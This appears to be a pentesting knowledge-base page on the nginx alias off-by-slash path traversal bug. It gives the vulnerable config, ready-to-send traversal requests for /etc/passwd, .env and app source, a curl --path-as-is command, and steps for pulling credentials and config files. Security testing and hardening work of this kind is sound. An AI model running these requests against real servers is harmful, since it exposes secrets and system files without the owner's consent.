---
title: "nginx alias off-by-slash: traversal into the parent directory"
order: 1
description: "Exploiting the classic nginx location/alias off-by-slash: a location prefix without a trailing slash and an alias with one concatenate following characters, letting ../ reach files outside the mapped directory."
keywords:
  - nginx alias traversal
  - off by slash
  - location alias
  - path traversal
---

# Alias off-by-slash

The most common nginx file-serving bug: a `location` prefix without a trailing slash combined with an `alias` that has one. nginx strips the matched `location` text and appends the remainder of the URI to the `alias`, so the characters immediately after the prefix, including `..`, concatenate straight onto the filesystem path.

## The misconfiguration

```nginx
location /static {
    alias /var/www/app/static/;
}
```

The `location` is `/static` (no trailing slash). A request for `/static../config.php` has `../config.php` left after the stripped prefix, appended to the alias:

```
/var/www/app/static/ + ../config.php  ->  /var/www/app/config.php
```

So:

```
GET /static../app.py HTTP/1.1
GET /static../../etc/passwd HTTP/1.1
GET /static../.env HTTP/1.1
```

The correct form matches `location /static/` with the trailing slash (then `/static..` does not match the location at all), but the vulnerable form is everywhere.

## Finding it

- Note static prefixes from asset URLs in HTML/JS (`/static`, `/assets`, `/media`, `/files`, `/images`).
- For each, request `<prefix>../` plus a target: first the parent directory (`../config.php`, `../.env`, `../app.py`, `../wp-config.php`), then climb (`../../etc/passwd`).
- Try raw and encoded traversal (`..%2f`, `%2e%2e/`) in case a filter sits in front.
- Use `curl --path-as-is` so the client does not collapse `..` before sending.

```bash
curl --path-as-is https://target/static../config.php
```

## Exploitation

- One level up from a static directory almost always holds the application source and config; pull those first (they feed every other attack).
- Recovered `.env`/config yields secret keys and credentials; recovered source reveals the sinks for injection and deserialization.
- Climb to `/etc/passwd`, nginx config (`/etc/nginx/nginx.conf`), and app logs for further leverage.

## Tools

- **curl --path-as-is**, Burp Intruder with a traversal wordlist; **nuclei** nginx-alias templates.

## References

- nginx documentation: location, alias
- Orange Tsai: nginx off-by-slash research
